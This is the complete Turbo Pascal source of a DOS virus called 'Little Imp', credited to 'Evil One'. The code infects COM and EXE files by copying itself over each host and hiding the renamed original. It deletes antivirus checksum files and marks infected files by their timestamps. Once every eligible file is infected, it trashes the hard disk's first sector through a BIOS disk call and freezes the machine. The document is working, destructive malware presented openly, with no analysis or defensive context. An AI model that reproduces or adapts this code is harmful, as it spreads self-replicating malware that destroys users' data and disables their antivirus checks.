{
LITTLE IMP BY EVIL ONE
REPLACING SPAWNIG COM & EXE INFECTOR
COMPRESSED
RETRO VIRUS
TRASH MBR WHEN AL FILES INFECTED
}

{$A+,B-,D-,E-,F-,G+,I-,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$M 1024,0,0}

PROGRAM LITTLE_IMP;
USES DOS;
CONST VIRUS_SIZE=4790;
      MAXBUFF=63000;
VAR NO,TIME,I:LONGINT;
    ATTR:WORD;
    NOME,NOME2:STRING;
    ARQUIVO:ARRAY[1..3]OF FILE;
    PEEK:INTEGER;
    TESTTIME:DATETIME;
    BUFFER:ARRAY[1..MAXBUFF] OF BYTE;

PROCEDURE TRASH;
VAR BUFFER:ARRAY[1..512] OF BYTE;
    R:REGISTERS;
BEGIN
  WRITELN('LITTLE IMP BY EVIL ONE ');
  WRITELN('BALNEARIO CAMBORIU SC BRAZIL');
  R.ES:=SEG(BUFFER);
  R.BX:=OFS(BUFFER);
  R.AH:=5;
  R.DL:=128;
  R.DH:=0;
  R.CH:=0;
  R.CL:=0;
  R.AL:=1;
  INTR($13,R);
  REPEAT UNTIL 1=0;
END;

PROCEDURE DEL;
VAR F:FILE;
BEGIN
  ASSIGN(F,'ANTIVIR.DAT');
  ERASE(F);
  ASSIGN(F,'CHKLIST.MS');
  ERASE(F);
  ASSIGN(F,'CHKLIST.CPS');
  ERASE(F);
END;

FUNCTION PEGANOME:STRING;
VAR SEARCH:SEARCHREC;
    FILETIME:DATETIME;
    FLAG:BOOLEAN;

  PROCEDURE PROC1(BUSCA:STRING);
  BEGIN
    FINDFIRST(BUSCA,$3F,SEARCH);
    WHILE (DOSERROR=0)AND(FLAG=FALSE) DO BEGIN
      UNPACKTIME(SEARCH.TIME,FILETIME);
      IF NOT(FILETIME.MIN=03)AND(SEARCH.SIZE>VIRUS_SIZE)AND(SEARCH.SIZE<MAXBUFF) THEN BEGIN
        PEGANOME:=SEARCH.NAME;
        FLAG:=TRUE;
      END;
      FINDNEXT(SEARCH);
    END;
  END;

BEGIN
  FLAG:=FALSE;
  PEGANOME:='';
  PROC1('*.EXE');
  PROC1('*.COM');
END;

BEGIN
  NOME2:=PARAMSTR(0);
  NOME:=PEGANOME;
  IF NOME='COMMAND.COM' THEN NOME:='';
  IF NOME<>'' THEN BEGIN
    DEL;
    ASSIGN(ARQUIVO[1],NOME2);
    ASSIGN(ARQUIVO[2],NOME);
    ASSIGN(ARQUIVO[3],NOME);
    GETFATTR(ARQUIVO[2],ATTR);
    SETFATTR(ARQUIVO[2],ARCHIVE);
    RESET(ARQUIVO[3],1);
    GETFTIME(ARQUIVO[3],TIME);
    CLOSE(ARQUIVO[3]);
    RENAME(ARQUIVO[3],'_'+NOME);
    RESET(ARQUIVO[1],1);
    REWRITE(ARQUIVO[2],1);
    RESET(ARQUIVO[3],1);
    BLOCKREAD(ARQUIVO[1],BUFFER,VIRUS_SIZE);
    NO:=FILESIZE(ARQUIVO[3]);
    BLOCKWRITE(ARQUIVO[2],BUFFER,NO);
    SETFTIME(ARQUIVO[2],TIME);
    SETFTIME(ARQUIVO[3],TIME);
    FOR I:=1 TO 3 DO BEGIN
      GETFTIME(ARQUIVO[I],TIME);
      UNPACKTIME(TIME,TESTTIME);
      TESTTIME.MIN:=03;
      PACKTIME(TESTTIME,TIME);
      SETFTIME(ARQUIVO[I],TIME);
      CLOSE(ARQUIVO[I]);
    END;
    SETFATTR(ARQUIVO[3],HIDDEN);
    SETFATTR(ARQUIVO[2],ATTR);
  END ELSE TRASH;
  NOME:='_';
  FOR I:=3 TO LENGTH(NOME2) DO IF (NOME2[I]='\') THEN PEEK:=I;
  FOR I:=PEEK+1 TO LENGTH(NOME2) DO NOME:=NOME+NOME2[I];
  NOME2:='';
  FOR I:=1 TO PARAMCOUNT DO NOME2:=NOME2+PARAMSTR(I)+' ';
  SWAPVECTORS;
  EXEC(NOME,NOME2);
  SWAPVECTORS;
END.
